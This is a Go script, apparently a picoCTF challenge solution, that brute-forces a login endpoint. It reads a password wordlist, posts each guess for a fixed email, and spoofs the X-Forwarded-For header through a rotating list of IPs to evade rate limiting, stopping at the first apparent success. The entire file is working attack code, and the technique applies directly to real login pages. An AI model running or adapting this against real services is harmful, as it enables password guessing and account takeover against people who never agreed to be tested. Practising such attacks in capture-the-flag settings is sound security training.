package main

import (
	"bufio"
	"bytes"
	"encoding/json"
	"fmt"
	"io"
	"net/http"
	"os"
	"strings"
)

var email = "ctf-player@picoctf.org"
var passwordlist = "passwords.txt"

func getData(password string) ([]byte, error) {
	data := map[string]string{
		"email":    email,
		"password": password,
	}
	return json.Marshal(data)
}
func main() {
	ips := []string{"1.1.7.1", "2.2.2.2", "3.3.3.3", "4.4.4.4.4", "8.8.8.8", "9.9.9.9", "10.0.0.1", "10.0.0.2"}
	url := "http://amiable-citadel.picoctf.net:53563/login"

	file, err := os.Open(passwordlist)
	if err != nil {
		panic("could not read the wordlist.")
	}
	scanner := bufio.NewScanner(file)

	index := 0
	lenIps := len(ips)
	for scanner.Scan() {
		ip := ips[index%lenIps]
		index = index + 1%lenIps
		pass := scanner.Text()
		data, err := getData(pass)
		if err != nil {
			continue
		}
		println(" password : ", pass)
		req, err := http.NewRequest("POST", url, bytes.NewBuffer(data))
		if err != nil {
			continue
		}
		req.Header.Set("Content-type", "application/json")
		req.Header.Set("X-forwarded-For", ip)

		client := &http.Client{}
		res, err := client.Do(req)
		if err != nil {
			panic(err)
		}
		defer res.Body.Close()
		body, _ := io.ReadAll(res.Body)

		text := string(body)

		fmt.Println(text)
		if strings.Contains(text, "false") {
			fmt.Println("Invalid password / login failed")
		} else {
			fmt.Println("Login likely succeeded (message not found), passowrd is : ", pass)
			break
		}

	}

}
